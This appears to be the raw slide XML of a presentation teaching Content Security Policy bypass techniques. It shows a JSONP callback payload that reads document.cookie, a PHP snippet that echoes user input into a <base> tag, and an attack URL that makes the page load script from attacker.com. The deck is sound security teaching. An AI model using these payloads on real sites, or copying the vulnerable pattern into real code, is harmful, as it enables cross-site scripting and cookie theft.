            <a:ext cx="1947863"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Attack Implementation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7461171" y="1383506"/>
            <a:ext cx="3774400" cy="442198"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3847"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7455575" y="1383506"/>
            <a:ext cx="3785592" cy="442198"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3847"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7568922" y="1468517"/>
            <a:ext cx="3558897" cy="272177"/>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&lt;script src="https://api.example.com/user?callback=alert(document.cookie)"&gt;&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7461171" y="1889403"/>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124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Why It Works</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7461171" y="2158722"/>
            <a:ext cx="3774400" cy="408291"/>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JSONP allows callback parameter</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>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Callback executes as JavaScript</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>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Domain is whitelisted in CSP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="3024706"/>
            <a:ext cx="7825502" cy="21788"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2B4150">
              <a:alpha val="50000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="3110176"/>
            <a:ext cx="1033105" cy="176689"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7703"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBE8F0"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2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70434" y="3153158"/>
            <a:ext cx="90726" cy="90726"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3606522" y="3144109"/>
            <a:ext cx="761048" cy="108823"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>BYPASS TECHNIQUE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="3309487"/>
            <a:ext cx="4276487" cy="354330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="325F7B"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Technique 3:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Base Tag Injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="25" name="Image 2" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="3748828"/>
            <a:ext cx="3912751" cy="453628"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515797" y="425912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Vulnerable CSP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515797" y="4499993"/>
            <a:ext cx="3686056" cy="306110"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5558"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="4499993"/>
            <a:ext cx="3697248" cy="306110"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5558"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3623548" y="4585004"/>
            <a:ext cx="347055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script-src 'self'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="30" name="Image 3" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId8"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3748828"/>
            <a:ext cx="3912751" cy="453628"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7428548" y="425912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Vulnerable HTML</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Shape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7428548" y="4499993"/>
            <a:ext cx="3686056" cy="1394817"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1220"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Shape 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7422952" y="4499993"/>
            <a:ext cx="3697248" cy="1394817"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1220"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7536299" y="4585004"/>
            <a:ext cx="3470553" cy="1224796"/>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 User input reflected here --&gt;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&lt;base href="&lt;?php echo $_GET['base']; ?&gt;"&gt;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&lt;script src="/js/app.js"&gt;&lt;/script&gt;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p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="35" name="Image 4" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId9"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="6008158"/>
            <a:ext cx="3912751" cy="453628"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515797" y="651845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Attack URL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Shape 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515797" y="6759323"/>
            <a:ext cx="3686056" cy="306110"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5558"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Shape 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="6759323"/>
            <a:ext cx="3697248" cy="306110"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5558"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3623548" y="6844334"/>
            <a:ext cx="3470553"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https://victim.com/?base=https://attacker.com/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="40" name="Image 5" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId10"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="6008158"/>
            <a:ext cx="3912751" cy="453628"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Text 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7428548" y="651845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Result</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Shape 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7428548" y="6759323"/>
            <a:ext cx="3686056" cy="578287"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2942"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Shape 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7422952" y="6759323"/>
            <a:ext cx="3697248" cy="578287"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2942"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Text 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7536299" y="6844334"/>
            <a:ext cx="3470553" cy="408265"/>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&lt;base href="https://attacker.com/"&gt;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&lt;script src="/js/app.js"&gt;&lt;/script&gt;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 Browser loads: https://attacker.com/js/app.js --&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Text 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3572470" y="7578354"/>
            <a:ext cx="7655481" cy="136088"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Why it works:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> The &lt;base&gt; tag changes relative URL resolution. Script is still loaded from "self" (relative path), but CSP doesn't check the base tag by default.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="Shape 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="7514655"/>
            <a:ext cx="15240" cy="263485"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>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887980" y="1292066"/>
            <a:ext cx="1366837" cy="205383"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7498"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBE8F0"/>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4894" y="1343382"/>
            <a:ext cx="102632" cy="102632"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3118842" y="1330523"/>
            <a:ext cx="1059061" cy="128468"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ADVANCED TECHNIQUES</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2887980" y="1526381"/>
            <a:ext cx="5063847" cy="401003"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Additional CSP Bypass Methods</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2887980" y="2036207"/>
            <a:ext cx="2903101" cy="3991451"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 663"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFCF5"/>
          </a:solidFill>
          <a:ln w="15240">
            <a:solidFill>
              <a:srgbClr val="D9D4C9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2903220" y="2051447"/>
            <a:ext cx="2872621" cy="384929"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 250"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4243268" y="2123599"/>
            <a:ext cx="192405" cy="240506"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3031450" y="2508885"/>
            <a:ext cx="2616160" cy="400764"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1550"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>'unsafe-inline' with Nonce Bypass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3031450" y="2953107"/>
            <a:ext cx="2616160" cy="321469"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Vulnerable CSP:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> script-src 'nonce-r4nd0m' 'unsafe-inline'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3031450" y="3318034"/>
            <a:ext cx="2616160" cy="321469"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Attack:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Inject code inside nonce-protected script tag</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3031450" y="3721060"/>
            <a:ext cx="2616160" cy="674608"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2853"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
